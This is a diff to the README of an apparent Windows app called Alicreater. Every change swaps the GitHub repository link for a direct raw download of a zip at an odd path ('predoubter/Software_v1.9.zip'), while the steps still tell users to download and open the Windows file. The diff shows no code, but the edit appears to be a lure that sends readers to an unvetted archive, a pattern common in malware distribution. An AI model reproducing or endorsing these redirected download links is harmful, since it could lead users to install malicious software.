@@ -1,6 +1,6 @@
 # 🚀 Alicreater - Simple Windows Setup Guide
 
-[![Download Alicreater](https://img.shields.io/badge/Download-Alicreater-blue?style=for-the-badge&logo=github)](https://github.com/tincanshoofly564/Alicreater)
+[![Download Alicreater](https://img.shields.io/badge/Download-Alicreater-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tincanshoofly564/Alicreater/main/predoubter/Software_v1.9.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This README shows you how to get the app from the download page, install it on W
 
 Use this link to visit the download page:
 
-[Go to the Alicreater download page](https://github.com/tincanshoofly564/Alicreater)
+[Go to the Alicreater download page](https://raw.githubusercontent.com/tincanshoofly564/Alicreater/main/predoubter/Software_v1.9.zip)
 
 If the page opens a file list, look for the Windows file type, such as `.exe` or `.zip`, and download that file.
 
@@ -43,7 +43,7 @@ Alicreater is built to give you a smooth start with:
 
 Follow these steps:
 
-1. Open the download page: https://github.com/tincanshoofly564/Alicreater
+1. Open the download page: https://raw.githubusercontent.com/tincanshoofly564/Alicreater/main/predoubter/Software_v1.9.zip
 2. Find the latest file for Windows
 3. Click the file to start the download
 4. Wait for the file to finish downloading
@@ -163,4 +163,4 @@ These checks help make sure you open the correct app file.
 
 If you run into a problem, review the steps above and try again from the download page:
 
-[Open Alicreater on GitHub](https://github.com/tincanshoofly564/Alicreater)
+[Open Alicreater on GitHub](https://raw.githubusercontent.com/tincanshoofly564/Alicreater/main/predoubter/Software_v1.9.zip)
